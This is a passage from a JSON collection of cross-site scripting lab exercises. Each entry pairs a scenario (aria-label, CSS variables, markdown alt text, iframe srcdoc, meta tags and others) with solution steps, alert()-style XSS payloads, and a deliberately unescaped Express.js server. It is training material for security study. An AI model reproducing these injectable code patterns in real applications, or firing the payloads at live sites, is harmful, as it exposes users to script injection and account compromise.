      "Lab scenario": "XSS via `aria-label` reflection in accessibility component",
      "Lab Description": "The site supports screen readers with `aria-label` attributes on buttons and links. User-controlled values are inserted without escaping, allowing JS injection inside the DOM structure.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit malicious input like <img src=x onerror=alert(1)> as label",
        "The app reflects it in `aria-label` attributes or tooltips",
        "Payload is parsed and executed in DOM"
      ],
      "payloads": [
        "<img src=x onerror=alert('ariaXSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/label-button', (req, res) => {\n  const label = req.body.label;\n  res.send(`<html><body><button aria-label='${label}'>Click</button></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via CSS variable injection inside style tag",
      "Lab Description": "Users can define CSS variables (e.g., for themes), but values are interpolated directly into a `<style>` tag, allowing for JS injection in some browsers via `url(javascript:...)`.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit custom CSS variable like --bg:url(javascript:alert(1))",
        "App injects it inside a `<style>` block",
        "JS payload executes when used in a background property"
      ],
      "payloads": [
        "--bg:url(javascript:alert('cssVar'))",
        "--xss:url(data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/theme', (req, res) => {\n  const theme = req.body.vars;\n  res.send(`\n    <html>\n      <head>\n        <style>:root { ${theme} } body { background: var(--bg); }</style>\n      </head>\n      <body>Welcome</body>\n    </html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic script injection in error stack trace viewer",
      "Lab Description": "The application displays backend error stack traces for debugging. User input is sometimes logged and reflected in the error message, which is rendered with innerHTML for styling. An attacker can trigger an error with a crafted payload that executes in the trace viewer.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a request that causes a server error and includes a script in the input",
        "Error message reflects the input in the trace log",
        "Stack trace viewer uses innerHTML, executing the payload"
      ],
      "payloads": [
        "<script>alert('traceXSS')</script>",
        "<img src=x onerror=alert('stack')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/debug', (req, res) => {\n  const q = req.query.q;\n  try {\n    if (q.includes('<')) throw new Error('Invalid input: ' + q);\n    res.send('OK');\n  } catch (err) {\n    res.send(`\n      <html>\n        <body>\n          <h2>Error Trace</h2>\n          <div style='color:red'>${err.message}</div>\n        </body>\n      </html>\n    `);\n  }\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Markdown image alt injection in preview pane",
      "Lab Description": "Markdown input is rendered to HTML using a parser that does not escape special characters in image `alt` attributes. A payload in the alt text leads to DOM injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a markdown like ![\" onerror=alert(1)](x)",
        "Preview renders markdown using innerHTML",
        "Injected alt attribute triggers JavaScript"
      ],
      "payloads": [
        "![' onerror=alert(1)](x)",
        "![x\" onerror=alert('alt')](image.jpg)"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst marked = require('marked');\nconst app = express();\n\napp.use(express.text());\n\napp.post('/preview-md', (req, res) => {\n  const html = marked(req.body);\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via keyboard shortcut tooltip injection",
      "Lab Description": "Keyboard shortcuts are rendered from user-defined actions. The key description is inserted into tooltip HTML using innerHTML, leading to XSS when hovering.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Define a shortcut with key text: <img src=x onerror=alert(1)>",
        "Hover over the tooltip showing shortcut description",
        "Observe the payload being executed"
      ],
      "payloads": [
        "<img src=x onerror=alert('shortcut')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet shortcuts = [];\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-shortcut', (req, res) => {\n  shortcuts.push(req.body.key);\n  res.redirect('/shortcuts');\n});\n\napp.get('/shortcuts', (req, res) => {\n  const list = shortcuts.map(k => `<div class='tooltip' title='Shortcut: ${k}'>${k}</div>`).join('');\n  res.send(`<html><body>${list}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via video player subtitle track injection",
      "Lab Description": "The platform allows uploading subtitle (VTT) tracks that are rendered as HTML in a caption viewer. Malicious captions can contain script tags or on-event attributes.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload a VTT file containing malicious HTML inside cue",
        "Render the video with captions enabled",
        "Payload is injected into caption container"
      ],
      "payloads": [
        "<script>alert('subXSS')</script>",
        "<img src=x onerror=alert('track')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet track = '';\n\napp.use(express.text());\n\napp.post('/upload-track', (req, res) => {\n  track = req.body;\n  res.redirect('/player');\n});\n\napp.get('/player', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <video controls>\n          <track label=\"English\" kind=\"subtitles\" src=\"data:text/vtt,${encodeURIComponent(track)}\" default>\n        </video>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic `onload` injection in lazy-loaded components",
      "Lab Description": "The application lazy-loads components by injecting script and HTML fragments based on user input. A payload in the load path is inserted into an `img` tag as `src`, allowing `onerror` to execute.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft a malicious fragment path with an onerror payload",
        "Trigger the lazy-load mechanism",
        "App injects HTML dynamically, executing the script"
      ],
      "payloads": [
        "x\" onerror=\"alert('lazyXSS')",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/lazy-load', (req, res) => {\n  const fragment = req.query.fragment;\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const frag = '<img src=\"${fragment}\">';\n          document.body.insertAdjacentHTML('beforeend', frag);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via QR Code data reflection in preview screen",
      "Lab Description": "The application allows users to generate QR codes and preview the data embedded inside. The raw data is reflected in the preview window using innerHTML without escaping. If the data contains HTML, it will be executed in the browser.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a QR code data payload with HTML or script tags",
        "View the QR code preview page",
        "Observe the reflected data executing in the preview"
      ],
      "payloads": [
        "<script>alert('qrXSS')</script>",
        "<img src=x onerror=alert('qr')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/generate-qr', (req, res) => {\n  const data = req.body.qrdata;\n  res.send(`\n    <html>\n      <body>\n        <h3>QR Preview</h3>\n        <div id='preview'>${data}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via voice assistant command transcript display",
      "Lab Description": "The application includes a voice command recognition system that transcribes spoken input and displays it on the interface. If an attacker controls the input (e.g., via audio injection), the transcript can include executable HTML.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit or simulate a voice command that contains a script tag",
        "Transcript viewer renders it directly via innerHTML",
        "Script executes immediately"
      ],
      "payloads": [
        "<script>alert('voiceXSS')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet lastTranscript = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit-voice', (req, res) => {\n  lastTranscript = req.body.text;\n  res.redirect('/transcript');\n});\n\napp.get('/transcript', (req, res) => {\n  res.send(`<html><body><div id='speech'>${lastTranscript}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via image gallery caption rendering",
      "Lab Description": "Users can upload images and add captions. The captions are rendered using innerHTML below the images. If a caption contains a script or event handler, it will be executed.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Upload image with caption <img src=x onerror=alert(1)>",
        "Visit the gallery page",
        "Payload in caption executes under image"
      ],
      "payloads": [
        "<script>alert('captionXSS')</script>",
        "<img src=x onerror=alert('imgCaption')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet captions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-caption', (req, res) => {\n  captions.push(req.body.caption);\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = captions.map(c => `<figure><img src='cat.jpg'><figcaption>${c}</figcaption></figure>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via terminal output rendering in web-based CLI",
      "Lab Description": "The web-based CLI interface reflects command results using innerHTML. If a command returns crafted HTML, it gets executed in the terminal output.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Run a command like echo <script>alert(1)</script>",
        "Terminal reflects the output unsanitized",
        "Script executes in output container"
      ],
      "payloads": [
        "<script>alert('cliXSS')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/cli', (req, res) => {\n  const out = req.body.cmd;\n  res.send(`<html><body><pre>${out}</pre></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via chat bot training phrase injection",
      "Lab Description": "The app allows users to submit new training phrases for a chat bot. These phrases are listed in the UI for review, and are rendered via innerHTML. A malicious phrase can execute script code.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a training phrase like <script>alert('chat')</script>",
        "Navigate to training UI",
        "Script runs in reviewer’s browser"
      ],
      "payloads": [
        "<script>alert('botXSS')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet phrases = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/train', (req, res) => {\n  phrases.push(req.body.phrase);\n  res.redirect('/review');\n});\n\napp.get('/review', (req, res) => {\n  const html = phrases.map(p => `<div>${p}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via toast notification rendering",
      "Lab Description": "The application uses custom toast notifications to show user feedback messages. These messages are rendered using innerHTML. If attacker input is reflected in the message, arbitrary HTML can be injected and executed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Trigger a notification that includes user-controlled input (e.g., query param or form field)",
        "Craft payload like <img src=x onerror=alert(1)>",
        "App reflects input in toast popup via innerHTML",
        "Script executes on page load or user interaction"
      ],
      "payloads": [
        "<img src=x onerror=alert('toastXSS')>",
        "<svg/onload=alert('toast')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/notify', (req, res) => {\n  const msg = req.query.msg || 'Welcome';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const toast = document.createElement('div');\n          toast.className = 'toast';\n          toast.innerHTML = '${msg}';\n          document.body.appendChild(toast);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via calendar event title injection",
      "Lab Description": "The calendar app displays event titles in hover tooltips. These titles are user-controlled and inserted into the DOM without sanitization. JavaScript can be injected via the title.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create an event with title <img src=x onerror=alert(1)>",
        "Open the calendar view",
        "Hover over the event to trigger tooltip",
        "Payload executes on hover"
      ],
      "payloads": [
        "<img src=x onerror=alert('calendarXSS')>",
        "<svg/onload=alert('calendar')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet events = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-event', (req, res) => {\n  events.push(req.body.title);\n  res.redirect('/calendar');\n});\n\napp.get('/calendar', (req, res) => {\n  const html = events.map(t => `<div title='${t}'>📅</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via file rename form field",
      "Lab Description": "The file manager allows renaming files via a form. The new name is displayed as a label using innerHTML. Malicious input as filename can inject HTML or script.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Rename file to <script>alert(1)</script>",
        "Submit form",
        "Redirect to file list page",
        "Observe payload execution in file name label"
      ],
      "payloads": [
        "<script>alert('renameXSS')</script>",
        "<img src=x onerror=alert('rename')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet filenames = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/rename', (req, res) => {\n  filenames.push(req.body.newname);\n  res.redirect('/files');\n});\n\napp.get('/files', (req, res) => {\n  const html = filenames.map(f => `<div>${f}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via chat emoji replacement feature",
      "Lab Description": "The chat system replaces emoji shortcodes (e.g., :smile:) with images using innerHTML. If an attacker injects a pseudo-emoji string that contains HTML, it is directly parsed and executed.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send message with payload like :<script>alert(1)</script>:",
        "App attempts to parse emoji and uses innerHTML to replace",
        "Script executes inside chat history"
      ],
      "payloads": [
        ":<script>alert('emojiXSS')</script>:",
        ":<img src=x onerror=alert(1)>:"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet messages = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/chat', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/chatlog');\n});\n\napp.get('/chatlog', (req, res) => {\n  const log = messages.map(m => `<div>${m}</div>`).join('');\n  res.send(`<html><body>${log}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via HTML5 draggable attribute content",
      "Lab Description": "The application allows creating draggable items with custom labels. Labels are rendered using innerHTML. An attacker can inject script via a draggable item.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create draggable element with label <img src=x onerror=alert(1)>",
        "Drag item into drop area",
        "Script executes as the HTML is injected"
      ],
      "payloads": [
        "<div draggable='true' ondragstart=alert('dragXSS')>Drag</div>",
        "<img draggable='true' src=x onerror=alert('drag')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet items = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-item', (req, res) => {\n  items.push(req.body.label);\n  res.redirect('/drag');\n});\n\napp.get('/drag', (req, res) => {\n  const html = items.map(i => `<div draggable='true'>${i}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic favicon generator",
      "Lab Description": "The application lets users generate custom favicon previews from submitted SVG code. The SVG is directly rendered as a favicon and also previewed in a full-size viewer using innerHTML, making it vulnerable to script injection via SVG tags.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit an SVG containing <script> or onload attributes",
        "App renders the SVG in preview area using innerHTML",
        "Script executes when the page loads or favicon preview is clicked"
      ],
      "payloads": [
        "<svg xmlns='http://www.w3.org/2000/svg'><script>alert('faviconXSS')</script></svg>",
        "<svg><image href='x' onerror='alert(1)'></svg>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet svg = '';\n\napp.use(express.text());\n\napp.post('/favicon', (req, res) => {\n  svg = req.body;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><div>${svg}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via 3D model annotation tooltips",
      "Lab Description": "The 3D viewer app allows users to add annotations to models. These annotations are shown as tooltips rendered using innerHTML. Malicious input leads to XSS when hovering over annotation points.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add an annotation with payload like <img src=x onerror=alert(1)>",
        "Open the 3D model with annotations",
        "Hover over the tooltip to trigger the script"
      ],
      "payloads": [
        "<img src=x onerror=alert('3D-XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet annotations = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/annotate', (req, res) => {\n  annotations.push(req.body.note);\n  res.redirect('/model');\n});\n\napp.get('/model', (req, res) => {\n  const html = annotations.map(a => `<div class='tooltip'>${a}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via music playlist name rendering",
      "Lab Description": "The music app allows users to create custom playlist names. These names are rendered in the DOM using innerHTML when displaying playlists. A malicious name results in script execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create a playlist with a name like <script>alert(1)</script>",
        "Navigate to the playlist dashboard",
        "Script executes when the name is rendered"
      ],
      "payloads": [
        "<script>alert('playlistXSS')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet playlists = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/create-playlist', (req, res) => {\n  playlists.push(req.body.name);\n  res.redirect('/playlists');\n});\n\napp.get('/playlists', (req, res) => {\n  const html = playlists.map(p => `<div>${p}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via real-time poll voting labels",
      "Lab Description": "The poll app displays live results and includes user-submitted vote labels. These are rendered using innerHTML, and malicious labels can trigger XSS when displayed in the poll chart.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a vote with a label like <img src=x onerror=alert(1)>",
        "Wait for the result to render",
        "Observe script execution in chart or result box"
      ],
      "payloads": [
        "<img src=x onerror=alert('pollXSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet votes = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/vote', (req, res) => {\n  votes.push(req.body.label);\n  res.redirect('/results');\n});\n\napp.get('/results', (req, res) => {\n  const html = votes.map(v => `<li>${v}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via language switcher label reflection",
      "Lab Description": "The app allows switching between multiple languages. If a language label is attacker-controlled and reflected directly in a dropdown using innerHTML, it leads to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject a language name like <img src=x onerror=alert(1)>",
        "Load the language switcher component",
        "Payload executes inside dropdown on load"
      ],
      "payloads": [
        "<img src=x onerror=alert('langXSS')>",
        "<script>alert('lang')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet languages = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-lang', (req, res) => {\n  languages.push(req.body.lang);\n  res.redirect('/lang-switch');\n});\n\napp.get('/lang-switch', (req, res) => {\n  const html = languages.map(l => `<option>${l}</option>`).join('');\n  res.send(`<html><body><select>${html}</select></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via user-generated page title injection",
      "Lab Description": "The app allows users to set custom titles for pages they create. These titles are inserted into the `<title>` tag of the HTML document without sanitization, enabling XSS through script injection in the title context.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a page with title <script>alert('titleXSS')</script>",
        "Navigate to the page",
        "Browser parses and executes script inside <title> tag"
      ],
      "payloads": [
        "<script>alert('titleXSS')</script>",
        "\"></title><script>alert('breakout')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet pageTitle = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-title', (req, res) => {\n  pageTitle = req.body.title;\n  res.redirect('/page');\n});\n\napp.get('/page', (req, res) => {\n  res.send(`\n    <html>\n      <head><title>${pageTitle}</title></head>\n      <body><h1>Welcome</h1></body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via user-submitted avatar preview filename",
      "Lab Description": "Users can upload avatar images and preview them. The preview includes the uploaded file name as a caption. If the file name contains script, and is rendered without escaping, it triggers XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Upload an image with a filename like <img src=x onerror=alert(1)>",
        "Visit the preview page",
        "Payload executes as part of the caption"
      ],
      "payloads": [
        "<img src=x onerror=alert('avatar')>",
        "<svg/onload=alert('avatarXSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet filename = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-avatar', (req, res) => {\n  filename = req.body.name;\n  res.redirect('/preview-avatar');\n});\n\napp.get('/preview-avatar', (req, res) => {\n  res.send(`<html><body><img src='avatar.png'><p>${filename}</p></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via iframe sandbox escape with malformed srcdoc",
      "Lab Description": "The app loads user input into an iframe using the `srcdoc` attribute. When the input contains malformed tags or escaping characters, browsers may incorrectly parse and execute embedded scripts.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a payload using srcdoc with broken closing quotes",
        "Script escapes into the DOM",
        "Observe alert from unescaped context"
      ],
      "payloads": [
        "\"><script>alert('sandboxEscape')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet content = '';\n\napp.use(express.text());\n\napp.post('/srcdoc', (req, res) => {\n  content = req.body;\n  res.redirect('/frame');\n});\n\napp.get('/frame', (req, res) => {\n  res.send(`<html><body><iframe srcdoc=\"${content}\"></iframe></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via search autocomplete history rendering",
      "Lab Description": "The app stores user search terms and displays them as autocomplete suggestions in a dropdown. If search history includes injected HTML, it is rendered via innerHTML in the suggestion box.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Search for a term like <img src=x onerror=alert(1)>",
        "Autocomplete feature shows suggestion",
        "Script executes on display"
      ],
      "payloads": [
        "<img src=x onerror=alert('autoXSS')>",
        "<svg/onload=alert('autocomplete')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet searches = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  searches.push(req.body.term);\n  res.redirect('/suggestions');\n});\n\napp.get('/suggestions', (req, res) => {\n  const html = searches.map(s => `<li>${s}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via embedded comment in HTML rendering",
      "Lab Description": "The app displays article comments and allows HTML-like formatting. It uses innerHTML to render comments. An attacker can inject malformed comments with script inside a fake HTML comment, which may be parsed and executed in certain browsers or contexts.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit comment like <!--><script>alert(1)</script>",
        "App renders it with innerHTML",
        "Browser fails to recognize comment boundary and runs script"
      ],
      "payloads": [
        "<!--><script>alert('commentXSS')</script>",
        "<!--\"--><img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet comments = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/view-comments');\n});\n\napp.get('/view-comments', (req, res) => {\n  const html = comments.map(c => `<div>${c}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic meta tag content injection",
      "Lab Description": "The application sets meta tags dynamically based on user input, such as `<meta name='description'>`. The content attribute is directly populated from unescaped input, which allows for injection inside the HTML head.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a payload like \"><script>alert(1)</script>",
        "App inserts it into the meta tag’s content",
        "Browser executes script injected through broken attribute"
      ],
      "payloads": [
        "\"><script>alert('metaXSS')</script>",
        "'><img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-meta', (req, res) => {\n  desc = req.body.desc;\n  res.redirect('/meta-preview');\n});\n\napp.get('/meta-preview', (req, res) => {\n  res.send(`<html><head><meta name='description' content='${desc}'></head><body>Meta Set</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via file preview in filename-based viewer",
      "Lab Description": "The app previews file names in a table using innerHTML. Maliciously crafted filenames with script or malformed tags get executed when previewed.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Upload or simulate a file with a name like <script>alert(1)</script>",
        "Visit the preview page",
        "Script executes inside filename list"
      ],
      "payloads": [
        "<script>alert('filenameXSS')</script>",
        "<img src=x onerror=alert('file')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet files = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  files.push(req.body.filename);\n  res.redirect('/files');\n});\n\napp.get('/files', (req, res) => {\n  const html = files.map(f => `<li>${f}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via browser notification content injection",
      "Lab Description": "The app generates browser notifications based on user actions. Notification body content is passed via user input and used directly without sanitization, enabling payload injection that can trigger via the Notification API.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit payload like <img src=x onerror=alert(1)>",
        "Notification script inserts it as body",
        "Payload executes when notification triggers"
      ],
      "payloads": [
        "<img src=x onerror=alert('notifyXSS')>",
        "<svg/onload=alert('noti')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet msg = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-message', (req, res) => {\n  msg = req.body.msg;\n  res.redirect('/notify');\n});\n\napp.get('/notify', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          if (Notification.permission === 'granted') {\n            new Notification('Message', { body: '${msg}' });\n          } else {\n            Notification.requestPermission().then(p => {\n              if (p === 'granted') new Notification('Message', { body: '${msg}' });\n            });\n          }\n        </script>\n      </body>\n    </html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via modal dialog dynamic content",
      "Lab Description": "The application opens modal dialogs with content fetched from user-controlled sources. This content is injected into the modal body using innerHTML, allowing for script execution if malicious HTML is provided.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit content with <script>alert(1)</script>",
        "Open a modal where that content is loaded",
        "Script executes inside modal container"
      ],
      "payloads": [
        "<script>alert('modalXSS')</script>",
        "<img src=x onerror=alert('modal')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet modalContent = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-modal', (req, res) => {\n  modalContent = req.body.content;\n  res.redirect('/modal');\n});\n\napp.get('/modal', (req, res) => {\n  res.send(`<html><body>\n    <button onclick=\"document.getElementById('modal').style.display='block'\">Open</button>\n    <div id='modal' style='display:none'>${modalContent}</div>\n  </body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via print preview injection in report builder",
      "Lab Description": "The app provides printable reports and allows users to insert text blocks. These are rendered in a print preview window using innerHTML. Injected HTML leads to XSS on load or print.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Insert text block with <script>alert(1)</script>",
        "Open the print preview feature",
        "Script executes before print or during preview render"
      ],
      "payloads": [
        "<script>alert('printXSS')</script>",
        "<img src=x onerror=alert('print')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet blocks = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-block', (req, res) => {\n  blocks.push(req.body.block);\n  res.redirect('/print');\n});\n\napp.get('/print', (req, res) => {\n  const html = blocks.map(b => `<div>${b}</div>`).join('');\n  res.send(`<html><body>${html}<script>window.print()</script></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic breadcrumb trail rendering",
      "Lab Description": "The application constructs breadcrumb navigation based on the current path or user input. The labels are rendered using innerHTML without proper sanitization, allowing script injection through crafted breadcrumb segments.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Manipulate URL to include breadcrumb segment like <img src=x onerror=alert(1)>",
        "Breadcrumb renderer parses the segment and injects into DOM",
        "Script executes inside breadcrumb container"
      ],
      "payloads": [
        "<img src=x onerror=alert('crumbXSS')>",
        "<svg/onload=alert('breadcrumb')>"
      ],
